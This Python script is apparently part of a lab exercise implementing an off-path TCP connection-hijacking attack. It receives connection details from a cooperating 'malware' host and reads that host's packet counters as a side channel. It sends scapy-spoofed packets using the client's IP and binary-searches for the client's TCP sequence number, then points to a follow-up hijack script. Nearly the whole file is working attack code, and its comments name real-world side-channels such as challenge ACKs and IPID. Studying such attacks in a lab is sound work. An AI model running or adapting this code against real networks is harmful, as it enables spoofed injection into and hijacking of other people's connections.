#!/usr/bin/env python3
"""
Attacker VM (30.0.0.30)
Uses binary search to infer victim's SEQ number
Gets feedback from malware via packet counter side-channel
"""

import socket
import time
from scapy.all import IP, TCP, send, Raw
import threading

MALWARE_IP = "10.0.0.10"
MALWARE_PORT = 9998
ATTACKER_IP = "30.0.0.30"
TARGET_IP = "20.0.0.20"

found_connection = None
lock = threading.Lock()


def listen_for_connection():
    """Listen for connection notification from malware"""
    global found_connection
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", 9999))
    
    print("[*] Waiting for malware to report new connection...")
    
    while True:
        try:
            data, _ = sock.recvfrom(1024)
            msg = data.decode()
            
            if msg.startswith("CONN:"):
                # Extract connection info
                parts = msg.split(':')
                conn = {
                    'client_ip': parts[1],
                    'client_port': int(parts[2]),
                    'server_ip': parts[3],
                    'server_port': int(parts[4])
                }
                
                with lock:
                    found_connection = conn
                
                print("\n[!] CONNECTION RECEIVED FROM MALWARE")
                print(f"    Client:  {conn['client_ip']}:{conn['client_port']}")
                print(f"    Server:  {conn['server_ip']}:{conn['server_port']}")
                
        except Exception as e:
            print(f"[-] Error: {e}")


def get_packet_count():
    """Query malware for current packet count"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(b"GET_COUNT", (MALWARE_IP, MALWARE_PORT))
        
        # Wait for response
        sock.settimeout(2)
        data, _ = sock.recvfrom(1024)
        
        in_segs, out_segs = map(int, data.decode().split(','))
        return in_segs, out_segs
    
    except socket.timeout:
        print("[-] Timeout waiting for malware response")
        return 0, 0
    except Exception as e:
        print(f"[-] Error getting packet count: {e}")
        return 0, 0


def send_probe(seq, ack, sport, dport):
    """Send probing packet with spoofed client IP"""
    pkt = (
        IP(src="10.0.0.10", dst="20.0.0.20")
        / TCP(
            sport=sport,
            dport=dport,
            flags="PA",
            seq=seq,
            ack=ack
        )
        / Raw(load=b"PROBE")
    )
    
    send(pkt, verbose=False)


def binary_search_seq(sport, dport):
    """
    Binary search for correct SEQ number using packet counter feedback
    
    If SEQ is in-window → packet lands inside receive window → counter increments
    If SEQ is out-of-window → packet dropped → counter doesn't change
    """
    
    print("\n" + "=" * 60)
    print("  BINARY SEARCH: Finding Client SEQ")
    print("=" * 60)
    
    low = 0
    high = 2**32
    iteration = 0
    
    # Initial baseline
    time.sleep(1)
    baseline_in, baseline_out = get_packet_count()
    print(f"\n[*] Baseline: InSegs={baseline_in}, OutSegs={baseline_out}")
    
    while high - low > 256 and iteration < 32:
        iteration += 1
        mid = (low + high) // 2
        
        print(f"\n[{iteration}] Testing SEQ={mid}")
        print(f"    Range: [{low}, {high}]")
        
        # Send probe with this SEQ
        send_probe(seq=mid, ack=0, sport=sport, dport=dport)
        
        # Wait for it to process
        time.sleep(0.5)
        
        # Get current count
        in_segs, out_segs = get_packet_count()
        in_diff = in_segs - baseline_in
        
        print(f"    InSegs diff: {in_diff}")
        
        if in_diff > 0:
            # Packet was in-window!
            print(f"    ✓ SEQ {mid} IN-WINDOW")
            low = mid
            baseline_in = in_segs  # Update baseline
        else:
            # Out of window
            print(f"    ✗ SEQ {mid} OUT-OF-WINDOW")
            high = mid
    
    found_seq = low
    print(f"\n" + "!" * 60)
    print(f"  FOUND SEQ: {found_seq}")
    print("!" * 60)
    
    return found_seq


def infer_ack_from_server(sport, dport):
    """
    Get ACK by reading from capture of server response
    Or use challenge ACK technique
    
    For simplicity in lab: we'll try common values around ISN
    """
    
    print("\n" + "=" * 60)
    print("  Finding Server SEQ (ACK value)")
    print("=" * 60)
    
    # In real attack, this would come from:
    # 1. Challenge ACK responses from server
    # 2. IPID side-channel
    # 3. Or packet capture
    
    # For lab, we'll do a smaller search around expected range
    print("[*] Trying to infer from server responses...")
    
    # Send SYN to establish baseline
    pkt = (
        IP(src="10.0.0.10", dst="20.0.0.20")
        / TCP(sport=sport, dport=dport, flags="S", seq=1000, ack=0)
    )
    send(pkt, verbose=False)
    
    time.sleep(1)
    
    # The server will respond with SYN-ACK
    # Its SEQ is what we need as our ACK
    # For this lab, we'll estimate or use the firewall's notification
    
    print("[*] Server SEQ inference would use side-channels in real attack")
    print("[*] For lab: we'll use challenge ACK or firewall logs")
    
    return None


def main():
    print("=" * 60)
    print("  Attacker (Off-Path) - 30.0.0.30")
    print("=" * 60)
    
    # Start listener for connection notifications
    listener_thread = threading.Thread(target=listen_for_connection, daemon=True)
    listener_thread.start()
    
    print("[*] Waiting for victim to make connection...")
    
    # Wait for connection to be reported
    while found_connection is None:
        time.sleep(1)
    
    conn = found_connection
    sport = conn['client_port']
    dport = conn['server_port']
    
    print(f"\n[+] Connection ready!")
    print(f"    Client port: {sport}")
    print(f"    Server port: {dport}")
    
    # Start SEQ inference
    inferred_seq = binary_search_seq(sport, dport)
    
    print(f"\n[+] Inferred Client SEQ: {inferred_seq}")
    print("[*] Next step: Attacker sends spoofed SYN-ACK and hijacks connection")
    print("[*] Run: sudo python3 attacker_hijack.py " + str(inferred_seq) + " " + str(sport))


if __name__ == "__main__":
    main()
